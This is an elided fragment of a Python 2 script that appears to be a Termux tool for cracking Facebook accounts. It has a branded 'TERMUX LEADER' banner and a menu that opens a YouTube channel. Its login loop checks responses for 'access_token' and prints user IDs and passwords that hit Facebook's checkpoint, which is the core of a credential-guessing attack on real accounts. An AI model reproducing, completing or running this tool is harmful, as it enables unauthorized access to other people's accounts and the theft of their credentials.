...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 Leader705 💗
\x1b[1;91m➣ PGE NAME :  💣TERMUX LEADER💣
\x1b[1;93m➣ WHATSAPP NO :   👬 No Available 👬
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://youtube.com/c/LeaderTechnologychannel')
		login()
	elif ahmad =='0':
		exb()
	else:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[Leader-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
